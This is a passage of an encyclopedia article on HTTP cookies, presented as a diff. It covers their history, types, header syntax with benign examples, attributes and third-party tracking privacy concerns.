@@ -1,0 +1,407 @@
+other uses|Cookie (disambiguation)
+pp-vandalism|small=yes
+HTTP
+An HTTP cookie (also called web cookie, Internet cookie, browser cookie, or simply cookie) is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing. Cookies were designed to be a reliable mechanism for websites to remember program state|stateful information (such as items added in the shopping cart in an online store) or to record the user's browsing activity (including clicking particular buttons, access control|logging in, or recording which pages were visited in the past). They can also be used to remember arbitrary pieces of information that the user previously entered into form fields such as names, addresses, passwords, and credit card numbers.
+
+Other kinds of cookies perform essential functions in the modern web. Perhaps most importantly, authentication cookies are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in with. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate themselves by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's comparison of web browsers#Vulnerabilities|web browser, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a hacker (computer security)|hacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see cross-site scripting and cross-site request forgery for examples).<ref>cite web |url=http://news.cnet.com/8301-10789_3-9918582-57.html |first=Robert |last=Vamosi |title=Gmail cookie stolen via Google Spreadsheets|website=News.cnet.com |date=2008-04-14|accessdate=19 October 2017</ref>
+
+The tracking cookies, and especially #Third-party cookie|third-party tracking cookies, are commonly used as ways to compile long-term records of individuals' browsing histories En dash a potential Internet privacy#HTTP cookies|privacy concern that prompted European<ref>cite web |title=What about the "EU Cookie Directive"? |url=http://webcookies.org/faq/#Directive |year=2013 |publisher=WebCookies.org|accessdate=19 October 2017</ref> and U.S. lawmakers to take action in 2011.<ref name="eulaw">cite news |url=https://www.bbc.co.uk/news/technology-12668552 |work=BBC |title=New net rules set to make cookies crumble |date=2011-03-08 </ref><ref>cite web |url=http://adage.com/article/digital/sen-rockefeller-ready-a-real-track-bill/227426/ |work=Adage.com |title=Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising |date=2011-05-06</ref> European law requires that all websites targeting European Union member states gain "informed consent" from users before storing non-essential cookies on their device.
+
+Google Project Zero (Google)|Project Zero researcher Jann Horn describes ways cookies can be read by Man-in-the-middle attack|intermediaries, like Wi-Fi hotspot providers. He recommends to use the browser in incognito mode in such circumstances.<ref>[https://thejh.net/written-stuff/want-to-use-my-wifi? Want to use my wifi?], Jann Horn, accessed 2018-01-05.</ref>
+
+Background
+=Origin of the name=
+The term "cookie" was coined by web browser programmer Lou Montulli. It was derived from the term "magic cookie", which is a packet of data a program receives and sends back unchanged, used by Unix programmers.<ref>cite web|url=http://dominopower.com/article/where-cookie-comes-from/|title=Where cookie comes from :: DominoPower|website=dominopower.com|accessdate=19 October 2017</ref><ref>cite web|last1=Raymond|first1=Eric (ed.)|title=magic cookie|url=http://catb.org/jargon/html/M/magic-cookie.html|website=The Jargon File  (version 4.4.7)|accessdate=8 September 2017</ref>
+
+=History=
+Magic cookies were already used in computing when computer programmer Lou Montulli had the idea of using them in web communications in June 1994.<ref>cite news |url=https://www.nytimes.com/2001/09/04/technology/04COOK.html |work=The New York Times |first=John |last=Schwartz |title=Giving Web a Memory Cost Its Users Privacy |date=2001-09-04 </ref> At the time, he was an employee of Netscape Communications, which was developing an e-commerce application for MCI Inc.|MCI. Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. MCI did not want its servers to have to retain partial transaction states, which led them to ask Netscape to find a way to store that state in each user's computer instead. Cookies provided a solution to the problem of reliably implementing a Shopping cart software|virtual shopping cart.<ref name="ks">Kesan, Jey; and Shah, Rajiv ; [http://papers.ssrn.com/sol3/papers.cfm?abstract_id=597543 ''Deconstructing Code''], SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389</ref><ref name="kristol">Kristol, David; ''HTTP Cookies: Standards, privacy, and politics'', ACM Transactions on Internet Technology, 1(2), 151–198, 2001 DOI|10.1145/502152.502153 (an expanded version is freely available at [https://arxiv.org/abs/cs.SE/0105018 arXiv:cs/0105018v1 [cs.SE&#93;])</ref>
+
+Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of Netscape Navigator|Mosaic Netscape, released on October 13, 1994,<ref>cite web |url=http://wp.netscape.com/newsref/pr/newsrelease1.html |title=Press Release: Netscape Communications Offers New Network Navigator Free On The Internet |publisher=Web.archive.org |accessdate=2010-05-22 |archiveurl = https://web.archive.org/web/20061207145832/http://wp.netscape.com/newsref/pr/newsrelease1.html |archivedate=2006-12-07 </ref><ref>cite web |url=https://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328 |title=Usenet Post by Marc Andreessen: Here it is, world! |publisher=Groups.google.com |date=1994-10-13 |accessdate=2010-05-22</ref> supported cookiescitation needed|date=May 2015. The first use of cookies (out of the labs) was checking whether visitors to the Netscape website had already visited the site. Montulli applied for a patent for the cookie technology in 1995, and Cite patent|US|5774670 was granted in 1998. Support for cookies was integrated in Internet Explorer in version 2, released in October 1995.<ref>cite news |first=Sandi |last=Hardmeier |url=http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx |title=The history of Internet Explorer |publisher=Microsoft |date=2005-08-25 |accessdate=2009-01-04</ref>
+
+The introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of their presence. The general public learned about cookies after the ''Financial Times'' published an article about them on February 12, 1996.<ref>cite news|last=Jackson|first=T|title=This Bug in Your PC is a Smart Cookie|newspaper=Financial Times|date=1996-02-12</ref> In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. Federal Trade Commission hearings in 1996 and 1997.
+
+The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk electronic mailing list|mailing list. A special working group within the Internet Engineering Task Force (IETF) was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by Brian Behlendorf and David Kristol respectively. But the group, headed by Kristol himself and Lou Montulli, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.
+
+At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was superseded by RFC 2965 in October 2000.
+
+RFC 2965 added a <code>Set-Cookie2</code> header, which informally came to be called "RFC 2965-style cookies" as opposed to the original <code>Set-Cookie</code> header which was called "Netscape-style cookies".<ref>cite web |url=https://staff.washington.edu/fmf/2009/06/19/setting-cookies/ |title=Setting Cookies |date=June 19, 2009 |website=staff.washington.edu</ref><ref>The edbrowse documentation version 3.5 said "Note that only Netscape-style cookies are supported.  However, this is the most common flavor of cookie.  It will probably meet your needs." This paragraph was removed in [http://edbrowse.org/usersguide.html#cook later versions of the documentation] further to RFC 2965's deprecation.</ref> <code>Set-Cookie2</code> was seldom used however, and was deprecated in RFC 6265 in April 2011 which was written as a definitive specification for cookies as used in the real world.<ref name="HTTPStateMgmtToPS">cite web|last1=Hodges|first1=Jeff|last2=Corry|first2=Bil|title='HTTP State Management Mechanism' to Proposed Standard|url=http://www.thesecuritypractice.com/the_security_practice/2011/03/http-state-management-mechanism-to-proposed-standard.html|website=The Security Practice|accessdate=17 June 2016|date=6 March 2011</ref>
+
+Terminology
+Refimprove section|date=August 2011
+
+=Session cookie=
+A ''session cookie'', also known as an ''in-memory cookie'', ''transient cookie'' or ''non-persistent cookie'', exists only in temporary memory while the user navigates the website.<ref name="mscookie">Microsoft Support [http://support.microsoft.com/kb/223799/EN-US Description of Persistent and Per-Session Cookies in Internet Explorer] Article ID 223799, 2007</ref>
+Web browsers normally delete session cookies when the user closes the browser.<ref>cite web |url= http://msdn.microsoft.com/en-us/library/ms526029(v=vs.90).aspx |title=Maintaining session state with cookies |work=Microsoft Developer Network |accessdate=22 October 2012</ref> Unlike other cookies, session cookies do not have an expiration date assigned to them, which is how the browser knows to treat them as session cookies.
+
+=Persistent cookie=
+Instead of expiring when the web browser is closed as session cookies do, a ''persistent cookie'' expires at a specific date or after a specific length of time. This means that, for the cookie's entire lifespan (which can be as long or as short as its creators want), its information will be transmitted to the server every time the user visits the website that it belongs to, or every time the user views a resource belonging to that website from another website (such as an advertisement).
+
+For this reason, persistent cookies are sometimes referred to as ''tracking cookies'' because they can be used by advertisers to record information about a user's web browsing habits over an extended period of time. However, they are also used for "legitimate" reasons (such as keeping users logged into their accounts on websites, to avoid re-entering login credentials at every visit).
+
+These cookies are however reset if the expiration time is reached or the user manually deletes the cookie.
+
+=Secure cookie=
+A ''secure cookie'' can only be transmitted over an encrypted connection (i.e. HTTP Secure|HTTPS). They cannot be transmitted over unencrypted connections (i.e. HTTP). This makes the cookie less likely to be exposed to cookie theft via eavesdropping. A cookie is made secure by adding the <code>Secure</code> flag to the cookie.
+
+=anchor|HttpOnly cookieHttp-only cookie=
+An ''http-only cookie'' cannot be accessed by client-side APIs, such as JavaScript. This restriction eliminates the threat of cookie theft via cross-site scripting (XSS). However, the cookie remains vulnerable to cross-site tracing (XST) and cross-site request forgery (XSRF) attacks. A cookie is given this characteristic by adding the <code>HttpOnly</code> flag to the cookie.
+
+=anchor|SameSite cookieSame-site cookie=
+In 2016 Google Chrome version 51 introduced<ref>Cite web|url=https://www.chromestatus.com/feature/4672634709082112|title='SameSite' cookie attribute, Chrome Platform tatus|website=Chromestatus.com|access-date=2016-04-23</ref> a new kind of cookie, the ''same-site cookie'', which can only be sent in requests ''originating'' from the same origin as the target domain. This restriction mitigates attacks such as cross-site request forgery (XSRF).<ref>Cite web|url=https://tools.ietf.org/html/draft-west-first-party-cookies-07|title=Same-site Cookies|last=Goodwin|first=Mark|last2=West|first2=Mike|website=tools.ietf.org|access-date=2016-04-23</ref> A cookie is given this characteristic by setting the <code>SameSite</code> flag to <code>Strict</code> or <code>Lax</code>.<ref>Cite web|url=https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00|title=Same-Site Cookies draft-ietf-httpbis-cookie-same-site-00|last=Goodwin|last2=West|first=M.|website=tools.ietf.org|access-date=2016-07-28</ref>
+
+=Third-party cookie=
+Normally, a cookie's domain attribute will match the domain that is shown in the web browser's address bar. This is called a ''first-party cookie''. A ''third-party cookie'', however, belongs to a domain different from the one shown in the address bar. This sort of cookie typically appears when web pages feature content from external websites, such as banner advertisements. This opens up the potential for tracking the user's browsing history and is often used by advertisers in an effort to serve relevant advertisements to each user.
+
+As an example, suppose a user visits <code>www.example.org</code>. This website contains an advertisement from <code>ad.foxytracking.com</code>, which, when downloaded, sets a cookie belonging to the advertisement's domain (<code>ad.foxytracking.com</code>). Then, the user visits another website, <code>www.foo.com</code>, which also contains an advertisement from <code>ad.foxytracking.com</code> and sets a cookie belonging to that domain (<code>ad.foxytracking.com</code>). Eventually, both of these cookies will be sent to the advertiser when loading their advertisements or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites that have ads from this advertiser.
+
+as of|2014, some websites were setting cookies readable for over 100 third-party domains.<ref>cite web |url=http://webcookies.org/third-party-cookies/ |title=Third party domains |publisher=WebCookies.org</ref> On average, a single website was setting 10 cookies, with a maximum number of cookies (first- and third-party) reaching over 800.<ref>cite web |url=http://webcookies.org/number-of-cookies/ |title=Number of cookies |publisher=WebCookies.org</ref>
+
+Most modern web browsers contain privacy settings that can block third-party cookies.
+
+=Supercookie=
+A ''supercookie'' is a cookie with an origin of a top-level domain (such as <code>.com</code>) or a public suffix (such as <code>.co.uk</code>). Ordinary cookies, by contrast, have an origin of a specific domain name, such as <code>example.com</code>.
+
+Supercookies can be a potential security concern and are therefore often blocked by web browsers. If unblocked by the browser, an attacker in control of a malicious website could set a supercookie and potentially disrupt or impersonate legitimate user requests to another website that shares the same top-level domain or public suffix as the malicious website. For example, a supercookie with an origin of <code>.com</code>, could maliciously affect a request made to <code>example.com</code>, even if the cookie did not originate from <code>example.com</code>. This can be used to fake logins or change user information.
+
+The Public Suffix List<ref>cite web|url=https://publicsuffix.org/learn/|title=Learn more about the Public Suffix List|website=Publicsuffix.org|accessdate=28 July 2016</ref> helps to mitigate the risk that supercookies pose. The Public Suffix List is a cross-vendor initiative that aims to provide an accurate and up-to-date list of domain name suffixes. Older versions of browsers may not have an up-to-date list, and will therefore be vulnerable to supercookies from certain domains.
+
+Other uses
+The term "supercookie" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such "supercookie" mechanisms were found on Microsoft websites in August 2011: cookie syncing that respawned MUID (machine unique identifier) cookies, and HTTP ETag|ETag cookies.<ref>cite web |last=Mayer |first=Jonathan |date=19 August 2011 |title=Tracking the Trackers: Microsoft Advertising |url=http://cyberlaw.stanford.edu/node/6715 |publisher=The Center for Internet and Society |accessdate=28 September 2011 </ref> Due to media attention, Microsoft later disabled this code.<ref>cite web |last=Vijayan |first=Jaikumar |title=Microsoft disables 'supercookies' used on MSN.com visitors |url=http://www.computerworld.com/article/2510494/data-privacy/microsoft-disables--supercookies--used-on-msn-com-visitors.html |accessdate=23 November 2014 </ref>
+
+=Zombie cookie=
+Main|Zombie cookie|Evercookie
+A ''zombie cookie'' is a cookie that is automatically recreated after being deleted. This is accomplished by storing the cookie's content in multiple locations, such as Local shared object|Flash Local shared object, Web storage|HTML5 Web storage, and other client-side and even server-side locations. When the cookie's absence is detected,clarify|By what mechanism?|date=July 2018 the cookie is recreatedclarify|By what mechanism?|date=July 2018 using the data stored in these locations.
+
+Structure
+A cookie consists of the following components:<ref name="Peng, Weihong 2000">cite web|title=HTTP Cookies, A Promising Technology|url=http://search.proquest.com/docview/194487945?accountid=14541|work=Proquest|publisher=Online Information Review|accessdate=29 March 2013|author=Peng, Weihong|author2=Cisna, Jennifer|year=2000</ref><ref name="Stenberg, Daniel 2009">Jim Manico quoting Daniel Stenberg, [http://manicode.blogspot.it/2009/08/real-world-cookie-length-limits.html Real world cookie length limits]</ref>
+
+# Name
+# Value
+# Zero or more attributes (name/value pairs). Attributes store information such as the cookie's expiration, domain, and flags (such as <code>Secure</code> and <code>HttpOnly</code>).
+
+Uses
+=Session management=
+Cookies were originally introduced to provide a way for users to record items they want to purchase as they navigate throughout a website (a virtual "shopping cart" or "shopping basket").<ref name="ks" /><ref name="kristol" /> Today, however, the contents of a user's shopping cart are usually stored in a database on the server, rather than in a cookie on the client. To keep track of which user is assigned to which shopping cart, the server sends a cookie to the client that contains a unique identifier|unique session identifier (typically, a long string of random letters and numbers). Because cookies are sent to the server with every request the client makes, that session identifier will be sent back to the server every time the user visits a new page on the website, which lets the server know which shopping cart to display to the user.
+
+Another popular use of cookies is for logging into websites. When the user visits a website's login page, the web server typically sends the client a cookie containing a unique session identifier. When the user successfully logs in, the server remembers that that particular session identifier has been authenticated and grants the user access to its services.
+
+Because session cookies only contain a unique session identifier, this makes the amount of personal information that a website can save about each user virtually limitless—the website is not limited to restrictions concerning how large a cookie can be. Session cookies also help to improve page load times, since the amount of information in a session cookie is small and requires little bandwidth.
+
+=Personalization=
+Cookies can be used to remember information about the user in order to show relevant content to that user over time. For example, a web server might send a cookie containing the username that was last used to log into a website, so that it may be filled in automatically the next time the user logs in.
+
+Many websites use cookies for personalization based on the user's preferences. Users select their preferences by entering them in a web form and submitting the form to the server. The server encodes the preferences in a cookie and sends the cookie back to the browser. This way, every time the user accesses a page on the website, the server can personalize the page according to the user's preferences. For example, the Google search engine once used cookies to allow users (even non-registered ones) to decide how many search results per page they wanted to see.
+Also, DuckDuckGo uses cookies to allow users to set the viewing preferences like colors of the web page.
+
+=Tracking=
+See also|Web visitor tracking
+Tracking cookies are used to track users' web browsing habits. This can also be done to some extent by using the IP address of the computer requesting the page or the HTTP referer|referer field of the HTTP request header, but cookies allow for greater precision. This can be demonstrated as follows:
+
+# If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user. So the server creates a unique identifier (typically a string of random letters and numbers) and sends it as a cookie back to the browser together with the requested page.
+# From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested. The server not only sends the page as usual but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.
+
+By analyzing this log file, it is then possible to find out which pages the user has visited, in what sequence, and for how long.
+
+Corporations exploit users' web habits by tracking cookies to collect information about buying habits. The ''Wall Street Journal'' found that America's top fifty websites installed an average of sixty-four pieces of tracking technology onto computers, resulting in a total of 3,180 tracking files.<ref>Rainie, Lee (2012). Networked: The New Social Operating System. p. 237</ref> The data can then be collected and sold to bidding corporations.
+
+Implementation
+File:HTTP cookie exchange.svg|thumb|A possible interaction between a web browser and a web server holding a web page in which the server sends a cookie to the browser and the browser sends it back when requesting another page.
+
+Cookies are arbitrary pieces of data, usually chosen and first sent by the web server, and stored on the client computer by the web browser. The browser then sends them back to the server with every request, introducing state (computer science)|states (memory of previous events) into otherwise stateless HTTP transactions. Without cookies, each retrieval of a web page or component of a web page would be an isolated event, largely unrelated to all other page views made by the user on the website. Although cookies are usually set by the web server, they can also be set by the client using a scripting language such as JavaScript (unless the cookie's <code>HttpOnly</code> flag is set, in which case the cookie cannot be modified by scripting languages).
+
+The cookie specifications<ref name="httponlyrfc">IETF [//tools.ietf.org/html/rfc6265 HTTP State Management Mechanism, Apr, 2011] Obsoletes RFC 2965</ref><ref>cite web |title=Persistent client state HTTP cookies: Preliminary specification |url=http://wp.netscape.com/newsref/std/cookie_spec.html |archiveurl=https://web.archive.org/web/20070805052634/http://wp.netscape.com/newsref/std/cookie_spec.html |publisher=Netscape |archivedate=2007-08-05 |date=c. 1999 </ref><ref>RFC 2965, HTTP State Management Mechanism (Internet Engineering Task Force|IETF)</ref> require that browsers meet the following requirements in order to support cookies:
+* Can support cookies as large as 4,096 bytes in size.
+* Can support at least 50 cookies per Internet domain|domain (i.e. per website).
+* Can support at least 3,000 cookies in total.
+
+=Setting a cookie=
+Cookies are set using the <code>Set-Cookie</code> HTTP header, sent in an HTTP response from the web server. This header instructs the web browser to store the cookie and send it back in future requests to the server (the browser will ignore this header if it does not support cookies or has disabled cookies).
+
+As an example, the browser sends its first request for the homepage of the <code>www.example.org</code> website:
+<syntaxhighlight lang="http">
+GET /index.html HTTP/1.1
+Host: www.example.org
+...
+</syntaxhighlight>
+
+The server responds with two <code>Set-Cookie</code> headers:
+<syntaxhighlight lang="http">
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: theme=light
+Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT
+...
+</syntaxhighlight>
+
+The server's HTTP response contains the contents of the website's homepage. But it also instructs the browser to set two cookies. The first, "theme", is considered to be a ''session cookie'' since it does not have an <code>Expires</code> or <code>Max-Age</code> attribute. Session cookies are intended to be deleted by the browser when the browser closes. The second, "sessionToken", is considered to be a ''persistent cookie'' since it contains an <code>Expires</code> attribute, which instructs the browser to delete the cookie at a specific date and time.
+
+Next, the browser sends another request to visit the <code>spec.html</code> page on the website. This request contains a <code>Cookie</code> HTTP header, which contains the two cookies that the server instructed the browser to set:
+<syntaxhighlight lang="http">
+GET /spec.html HTTP/1.1
+Host: www.example.org
+Cookie: theme=light; sessionToken=abc123
+…
+</syntaxhighlight>
+
+This way, the server knows that this request is related to the previous one. The server would answer by sending the requested page, possibly including more <code>Set-Cookie</code> headers in the response in order to add new cookies, modify existing cookies, or delete cookies.
+
+The value of a cookie can be modified by the server by including a <code>Set-Cookie</code> header in response to a page request. The browser then replaces the old value with the new value.
+
+The value of a cookie may consist of any printable ASCII character (<code>!</code> through <code>~</code>, Unicode <code>\u0021</code> through <code>\u007E</code>) excluding <code>,</code> and <code>;</code> and whitespace characters. The name of a cookie excludes the same characters, as well as <code>=</code>, since that is the delimiter between the name and value. The cookie standard RFC 2965 is more restrictive but not implemented by browsers.
+
+The term "cookie crumb" is sometimes used to refer to a cookie's name–value pair.<ref name="CrumbExample">cite web |url=http://msdn2.microsoft.com/en-us/library/ms533693.aspx |title=Cookie Property |work=MSDN |publisher=Microsoft |accessdate=2009-01-04 </ref>
+
+Cookies can also be set by scripting languages such as JavaScript that run within the browser. In JavaScript, the object <code>document.cookie</code> is used for this purpose. For example, the instruction <code>document.cookie = "temperature=20"</code> creates a cookie of name "temperature" and value "20".<ref>cite news |first=Ross |last=Shannon |url=http://www.yourhtmlsource.com/javascript/cookies.html |title=Cookies, Set and retrieve information about your readers |publisher=HTMLSource |date=2007-02-26 |accessdate=2009-01-04 </ref>
+
+=Cookie attributes=
+In addition to a name and value, cookies can also have one or more attributes. Browsers do not include cookie attributes in requests to the server—they only send the cookie's name and value. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie to the server.
+
+Domain and path
+The <code>Domain</code> and <code>Path</code> attributes define the scope of the cookie. They essentially tell the browser what website the cookie belongs to. For obvious security reasons, cookies can only be set on the current resource's top domain and its sub domains, and not for another domain and its sub domains. For example, the website <code>example.org</code> cannot set a cookie that has a domain of <code>foo.com</code> because this would allow the <code>example.org</code> website to control the cookies of <code>foo.com</code>.
+
+If a cookie's <code>Domain</code> and <code>Path</code> attributes are not specified by the server, they default to the domain and path of the resource that was requested.<ref>cite web |url=http://tools.ietf.org/html/rfc6265#section-4.1.2.4 |work=IETF |title=HTTP State Management Mechanism, The Path Attribute |date=March 2014 </ref> However, in most browsers there is a difference between a cookie set from <code>foo.com</code> without a domain, and a cookie set with the <code>foo.com</code> domain. In the former case, the cookie will only be sent for requests to <code>foo.com</code>, also known as a host-only cookie. In the latter case, all sub domains are also included (for example, <code>docs.foo.com</code>).<ref>cite web |url=http://tools.ietf.org/html/rfc6265#section-5.1.3 |work=IETF |title=RFC 6265, HTTP State Management Mechanism, Domain matching |date=March 2014 </ref><ref>cite web |url=http://tools.ietf.org/html/rfc6265#section-4.1.2.3 |work=IETF |title=RFC 6265, HTTP State Management Mechanism, The Domain Attribute |date=March 2014 </ref> A notable exception to this general rule is Edge prior to Windows 10 RS3 and Internet Explorer prior to IE 11 and Windows 10 RS4 (April 2018), which always send cookies to sub domains regardless of whether the cookie was set with or without a domain.<ref>cite web |url=https://blogs.msdn.microsoft.com/b/ieinternals/archive/2009/08/20/wininet-ie-cookie-internals-faq.aspx |title=Internet Explorer Cookie Internals (FAQ) | date=21 November 2018 </ref>
+
+Below is an example of some <code>Set-Cookie</code> HTTP response headers that are sent from a website after a user logged in. The HTTP request was sent to a webpage within the <code>docs.foo.com</code> subdomain:
+<syntaxhighlight lang="http">
+HTTP/1.0 200 OK
+Set-Cookie: LSID=DQAAAK…Eaem_vYg; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
+Set-Cookie: HSID=AYQEVn…DKrdst; Domain=.foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; HttpOnly
+Set-Cookie: SSID=Ap4P…GTEq; Domain=foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
+…
+</syntaxhighlight>
+
+The first cookie, <code>LSID</code>, has no <code>Domain</code> attribute, and has a <code>Path</code> attribute set to <code>/accounts</code>. This tells the browser to use the cookie only when requesting pages contained in <code>docs.foo.com/accounts</code> (the domain is derived from the request domain). The other two cookies, <code>HSID</code> and <code>SSID</code>, would be used when the browser requests any subdomain in <code>.foo.com</code> on any path (for example <code>www.foo.com/bar</code>). The prepending dot is optional in recent standards, but can be added for compatibility with RFC 2109 based implementations.<ref>cite web |url=http://tools.ietf.org/html/rfc2109#section-4.2.2 |work=IETF |title=RFC 2109, HTTP State Management Mechanism, Set-Cookie syntax |date=March 2014 </ref>
+
+Expires and Max-Age
+The <code>Expires</code> attribute defines a specific date and time for when the browser should delete the cookie. The date and time are specified in the form <code>Wdy, DD Mon YYYY HH:MM:SS GMT</code>, or in the form <code>Wdy, DD Mon YY HH:MM:SS GMT</code> for values of YY where YY is greater than or equal to 0 and less than or equal to 69.<ref>cite web|url=http://tools.ietf.org/html/rfc6265#section-5.1.1|title=RFC 6265, HTTP State Management Mechanism|work=ietf.org</ref>
+
+Alternatively, the <code>Max-Age</code> attribute can be used to set the cookie's expiration as an interval of seconds in the future, relative to the time the browser received the cookie. Below is an example of three <code>Set-Cookie</code> headers that were received from a website after a user logged in:
+<syntaxhighlight lang="http">
+HTTP/1.0 200 OK
+Set-Cookie: lu=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Jan 2013 21:47:38 GMT; Path=/; Domain=.example.com; HttpOnly
+Set-Cookie: made_write_conn=1295214458; Path=/; Domain=.example.com
+Set-Cookie: reg_fb_gate=deleted; Expires=Thu, 01 Jan 1970 00:00:01 GMT; Path=/; Domain=.example.com; HttpOnly
+</syntaxhighlight>
+
+The first cookie, <code>lu</code>, is set to expire sometime on 15 January 2013. It will be used by the client browser until that time. The second cookie, <code>made_write_conn</code>, does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie, <code>reg_fb_gate</code>, has its value changed to "deleted", with an expiration time in the past. The browser will delete this cookie right away because its expiration time is in the past. Note that cookie will only be deleted if the domain and path attributes in the <code>Set-Cookie</code> field match the values used when the cookie was created.
+
+As of|2016 Internet Explorer did not support <code>Max-Age</code>.<ref>Cite web|url=https://inikulin.github.io/cookie-compat/#MOZILLA0001|title=Cookies specification compatibility in modern browsers|last=|first=|date=2016|website=inikulin.github.io|access-date=2016-09-30</ref><ref>cite web|url=http://mrcoles.com/blog/cookies-max-age-vs-expires/|title=HTTP Cookies: What's the difference between Max-age and Expires? – Peter Coles|first=Peter|last=Coles|website=Mrcoles.com|accessdate=28 July 2016</ref>
+
+Secure and HttpOnly
+The <code>Secure</code> and <code>HttpOnly</code> attributes do not have associated values. Rather, the presence of just their attribute names indicates that their behaviors should be enabled.
+
+The <code>Secure</code> attribute is meant to keep cookie communication limited to encrypted transmission, directing browsers to use cookies only via HTTPS|secure/encrypted connections. However, if a web server sets a cookie with a secure attribute from a non-secure connection, the cookie can still be intercepted when it is sent to the user by man-in-the-middle attacks. Therefore, for maximum security, cookies with the Secure attribute should only be set over a secure connection.
+
+The <code>HttpOnly</code> attribute directs browsers not to expose cookies through channels other than HTTP (and HTTPS) requests. This means that the cookie cannot be accessed via client-side scripting languages (notably JavaScript), and therefore cannot be stolen easily via cross-site scripting (a pervasive attack technique).<ref name="Symantec-2007-2nd-exec">cite journal |title=Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary) |publisher=Symantec Corp. |volume=XIII |pages=1–3 |date=April 2008 |url=http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf |format=PDF |accessdate=May 11, 2008 </ref>
+
+Browser settings
+Most modern browsers support cookies and allow the user to disable them. The following are common options:<ref>cite web |first=David |last=Whalen |url=http://www.cookiecentral.com/faq/ |title=The Unofficial Cookie FAQ v2.6 |publisher=Cookie Central |date=June 8, 2002 |accessdate=2009-01-04 </ref>
+* To enable or disable cookies completely, so that they are always accepted or always blocked.
+* To view and selectively delete cookies using a cookie manager.
+* To fully wipe all private data, including cookies.
+
+By default, Internet Explorer allows third-party cookies only if they are accompanied by a P3P "CP" (Compact Policy) field.<ref>cite web |url=http://grack.com/blog/2010/01/06/3rd-party-cookies-dom-storage-and-privacy/ |title=3rd-Party Cookies, DOM Storage and Privacy |publisher=grack.com: Matt Mastracci's blog |date=January 6, 2010 |accessdate=2010-09-20 </ref>
+
+Add-on tools for managing cookie permissions also exist.<ref name="microsoft2007">cite web |url=http://support.microsoft.com/kb/283185 |title=How to Manage Cookies in Internet Explorer 6 |publisher=Microsoft |date=December 18, 2007 |accessdate=2009-01-04 </ref><ref>cite web |url=http://support.mozilla.com/en-US/kb/Clearing+Private+Data#top |title=Clearing private data |work=Firefox Support Knowledge base |publisher=Mozilla |date=16 September 2008 |accessdate=2009-01-04 </ref><ref>cite web |url=http://www.google.com/support/chrome/bin/answer.py?answer=95582 |title=Clear Personal Information : Clear browsing data |work=Google Chrome Help |publisher=Google |accessdate=2009-01-04 </ref><ref>cite web |url=http://www.google.com/support/chrome/bin/answer.py?answer=95626 |title=Clear Personal Information: Delete cookies |work=Google Chrome Help |publisher=Google |accessdate=2009-01-04 </ref>
+
+Privacy and third-party cookies
+See also|Do Not Track|Web analytics#Problems with cookies
+Cookies have some important implications on the privacy and anonymity of web users. While cookies are sent only to the server setting them or a server in the same Internet domain, a web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called ''third-party cookies''. The older standards for cookies, RFC 2109 and RFC 2965, specify that browsers should protect user privacy and not allow sharing of cookies between servers by default. However, the newer standard, RFC 6265, explicitly allows user agents to implement whichever third-party cookie policy they wish. Most browsers, such as Mozilla Firefox, Internet Explorer, Opera (web browser)|Opera, and Google Chrome, do allow third-party cookies by default, as long as the third-party website has P3P|Compact Privacy Policy published. Newer versions of Safari (web browser)|Safari block third-party cookies, and this is planned for Mozilla Firefox as well (initially planned for version 22 but postponed indefinitely).<ref>citation |url=https://developer.mozilla.org/en-US/docs/Site_Compatibility_for_Firefox_22 |work=Mozilla Developer Network |title=Site Compatibility for Firefox 22 |date=2013-04-11</ref>
+
+File:Third party cookie.png|thumb|In this fictional example, an advertising company has placed banners in two websites. By hosting the banner images on its servers and using third-party cookies, the advertising company is able to track the browsing of users across these two sites.
+Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or web bugs. Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences.
+
